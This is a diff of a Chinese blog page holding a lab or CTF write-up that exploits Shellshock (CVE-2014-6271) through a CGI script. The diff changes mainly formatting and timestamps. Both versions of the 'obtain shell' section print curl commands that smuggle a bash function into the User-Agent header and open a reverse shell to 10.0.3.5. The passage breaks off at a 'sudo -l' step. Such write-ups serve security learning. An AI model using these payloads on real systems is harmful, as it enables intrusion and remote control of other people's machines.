@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-05-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-05-24T13:02:29.250Z">
+<meta property="article:modified_time" content="2024-05-24T13:12:56.316Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="提权">
 <meta property="article:tag" content="信息搜集">
@@ -243,7 +243,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2024-05-24 00:00:00 / 修改时间：21:02:29" itemprop="dateCreated datePublished" datetime="2024-05-24T00:00:00+08:00">2024-05-24</time>
+      <time title="创建时间：2024-05-24 00:00:00 / 修改时间：21:12:56" itemprop="dateCreated datePublished" datetime="2024-05-24T00:00:00+08:00">2024-05-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -296,11 +296,11 @@ Platform | Enthusiasts &amp; Professionals</a></p>
 <p>换字典，后缀都没扫到可利用信息，看了 Writeups <span
 class="math inline">\(\Rightarrow\)</span> CGI 可利用</p>
 <blockquote>
-<p><strong>CGI 介绍</strong> CGI（Common Gateway
-Interface）通用网关接口，CGI 是接口标准。我们通常所说的 CGI 是指 CGI
-程序，即实现了 CGI 接口标准的程序。<a
-target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Perl">Perl</a> 是一个广泛被用来编写
-CGI 程序的语言，但 CGI 是独立于任何语言的。Web
+<p><strong>CGI 介绍</strong><br />
+CGI（Common Gateway Interface）通用网关接口，CGI
+是接口标准。我们通常所说的 CGI 是指 CGI 程序，即实现了 CGI
+接口标准的程序。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Perl">Perl</a>
+是一个广泛被用来编写 CGI 程序的语言，但 CGI 是独立于任何语言的。Web
 服务器无须对语言有任何了解。事实上，CGI 程序可以用任何 <a
 target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"
 title="脚本语言">脚本语言</a>或者<a
@@ -317,7 +317,8 @@ target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8
 title="C语言">C</a>/<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/C%2B%2B"
 title="C++">C++</a>和<a
 target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Visual_Basic"
-title="Visual Basic">Visual Basic</a>都可以用来编写CGI程序。CGI 工作流程
+title="Visual Basic">Visual Basic</a>都可以用来编写CGI程序。CGI
+工作流程<br />
 浏览器发送 http 请求到 web 服务器 <span
 class="math inline">\(\Rightarrow\)</span> web
 服务器接收并收集用户请求，然后交给对应 CGI 程序进行处理 <span
@@ -340,21 +341,24 @@ environment</a> or <a
 target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#shellshock">CGI
 | HackTricks | HackTricks</a>】</p>
 <blockquote>
-<p><strong>推荐阅读CVE-2014-6271漏洞分析</strong> <a
+<p><strong>推荐阅读CVE-2014-6271漏洞分析</strong><br />
+<a
 target="_blank" rel="noopener" href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">Bash破壳漏洞CVE-2014-6271复现分析
-– Zgao's blog</a> <a
+– Zgao's blog</a><br />
+<a
 target="_blank" rel="noopener" href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash
-3.0-4.3命令执行漏洞分析 - 知道创宇</a>
+3.0-4.3命令执行漏洞分析 - 知道创宇</a><br />
 注，CGI脚本会继承系统的环境变量。CGI环境变量在CGI程序启动时初始化，在结束时销毁。
 当一个CGI脚本未被HTTP服务器调用时，它的环境变量几乎是系统环境变量的复制，当这个CGI脚本被HTTP服务器调用时，它的环境变量就会增加关于HTTP服务器，客户端，CGI传输过程等条目</p>
 </blockquote>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405242009372.png" /></p>
-<p>简言之，CGI 在加载环境变量时会将 User-Agent 中的 () {
-解析成函数，导致子进程直接执行了 shell 命令，具体见 CVE 漏洞分析分析</p>
+<p>简言之，CGI 在加载环境变量时会因 User-Agent 中的 <code>() &#123;</code>
+而将其解析成函数，导致子进程直接执行了 shell 命令，具体参见 CVE
+漏洞分析</p>
 <h2 id="渗透攻击">2. 渗透攻击</h2>
 <h3 id="获取-shell">2.1. 获取 shell</h3>
 <p>反弹 shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4444 0&gt;&amp;1&#x27;&quot;</span> http://10.0.3.20/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 注，echo; 是测试漏洞所用忘记删了，可直接使用下面命令弹 shell</span></span><br><span class="line">curl -H <span class="string">&quot;user-agent: () &#123; :; &#125;; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4445 0&gt;&amp;1&#x27;&quot;</span> http://10.0.3.20/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4444 0&gt;&amp;1&#x27;&quot;</span> http://10.0.3.20/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 注，echo; 是测试漏洞所用忘记删了，最不影响但亦可直接使用下面命令弹 shell</span></span><br><span class="line">curl -H <span class="string">&quot;user-agent: () &#123; :; &#125;; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4445 0&gt;&amp;1&#x27;&quot;</span> http://10.0.3.20/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405242010445.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405242051137.png" /></p>
 <p><code>sudo -l</code> 得
